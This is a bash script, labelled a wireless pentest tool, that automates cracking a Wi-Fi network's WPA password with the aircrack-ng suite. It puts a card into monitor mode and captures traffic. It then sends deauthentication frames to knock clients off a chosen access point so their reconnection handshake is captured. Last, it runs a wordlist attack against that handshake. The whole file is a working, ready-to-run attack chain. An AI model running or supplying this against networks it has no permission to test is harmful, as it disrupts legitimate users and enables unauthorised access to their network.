#!/bin/bash
# please note that custom word lists need to be put into the folder /root/wordlists, or simply modify the script to point ot your own location.
# testing update
clear
# Introduction
echo "++++++++++++++++++++++++++++++++++++++"
echo "       Wireless pentest script        "
echo "++++++++++++++++++++++++++++++++++++++"
sleep 3

# Check for aircrack and dependencies
echo "Checking for aircrack suite and dependencies:"
sleep 1

DEPS="aircrack-ng"

for i in $DEPS ; do
    dpkg-query -W -f='${Package}\n' | grep ^$i$ > /dev/null
    if [ $? != 0 ] ; then
      echo "$i --> or some dependencies are missing!"
        sleep 1
        read -p "do you want install ($i)(y) or exit the script (n) :" choix
        if [ $choix = "y" ]; then
            echo "($i) Installing..."
            sudo apt-get install $i -y > /dev/null
            else
            exit
        fi
            else
            echo "$i --> Is installed script will now continue..."
        fi
    done 
sleep 3

# Cleaning up interface file
echo "Cleaning up old interface files:"
sleep 1
FILE=interfaces.txt
if [ -f $FILE ];
then
   echo "File $FILE exists."
	echo " Removing interfaces file from previous crack."
	rm interfaces.txt
else
   echo "File $FILE not present, script will now continue..."
fi

airmon-ng | grep mon | awk {'print $1'}>interfaces.txt

# Stop all interfaces that could be in monitor mode
for int in $(cat interfaces.txt);
do
	airmon-ng stop $int
done
sleep 3

# Clear out card file list and then list available cards
rm int.txt
airmon-ng | grep phy | awk {'print $1'} >> int.txt

prompt="Please select a file:"
options=( $(cat int.txt | xargs -0) )

PS3="$prompt "
select opt in "${options[@]}" "Quit" ; do 
    if (( REPLY == 1 + ${#options[@]} )) ; then
        exit

    elif (( REPLY > 0 && REPLY <= ${#options[@]} )) ; then
        echo  "You picked interface $opt $REPLY"
    	airmon-ng start $opt
	break
	else
        echo "Invalid option. Try another one."
    fi
done  

sleep 3

# To remove all old dump files please unhash the line rm *.cap
echo " Cleaning out any old dump files:)"
#rm *.cap
rm *.csv
rm *.kismet.*
sleep 3

# Starting up airdump and wash
rm -r dump-0*.*
xterm -e airodump-ng -w dump mon0 &
sleep 2

# Get required info from user
echo "Capturing available wireless networks.. please wait :) "
sleep 3
echo "Capture started"
sleep 10
read -n1 -r -p  "When you captured have enough network traffic, press Space to continue?" key
	 if [ "$key" = ' ' ]; then
		echo "Please wait ........."
	fi
clear
echo "++++++++++++++++++++++++++++++++++++++"
echo "       Enter info to begin crack      "
echo "++++++++++++++++++++++++++++++++++++++"
sleep 1
xterm -e cat dump-01.csv | awk 'BEGIN { FS=","; OFS=","; } {print $1,$4,$14}' dump-01.csv | grep -v ^',' &
sleep 1
echo -n "Please select Channel: "
read -e CHAN
echo -n "Name of output file to be created:"
read -e SESSION
echo -n "Please enter bssid : "
read -e BSSID
sleep 5

# Echo out test info
echo "Channel Number:" $CHAN 
echo "Session to be saved:" $SESSION 
echo "BSSID to be cracked:" $BSSID
read -p "Is this info correct? ($i)(y/n)" choix
	if [ $choix = "y" ]; then
		echo "Info saved for crack :) "
		else
		echo "Exiting script please enter correct info :)"
		exit 0
	fi
sleep 2

# Close any open TERMs
killall -TERM airodump-ng
killall -TERM wash

# Run airodump and send deaiths
echo " Sending 10 deauths to client pc to capture 4-way handshake"
xterm -e airodump-ng --ignore-negative-one --channel $CHAN -w $SESSION --bssid $BSSID mon0 &
xterm -e aireplay-ng --ignore-negative-one --deauth 10 -a $BSSID mon0 &
sleep 120
clear

prompt="Please select a dump file to crack:"
options=( $(ls -l *.cap | awk {'print $9'} | xargs -0) )

PS3="$prompt "
select opt1 in "${options[@]}" "Quit" ; do 
    if (( REPLY == 1 + ${#options[@]} )) ; then
        exit

    elif (( REPLY > 0 && REPLY <= ${#options[@]} )) ; then
        echo  "You picked file $opt1 $REPLY"
	break
        else
        echo "Invalid option. Try another one."
    fi
done  


prompt="Please select a wordlist to use:"
options=( $(ls -l /root/wordlists/* | awk {'print $9'} | xargs -0) )

PS3="$prompt "
select opt2 in "${options[@]}" "Quit" ; do 
    if (( REPLY == 1 + ${#options[@]} )) ; then
        exit

    elif (( REPLY > 0 && REPLY <= ${#options[@]} )) ; then
        echo  "You picked wordlist $opt2 $REPLY"
	break
        else
        echo "Invalid option. Try another one."
    fi
done  

killall -TERM airodump-ng

# Use password list to crack captured handshake
aircrack-ng $opt1 -w $opt2
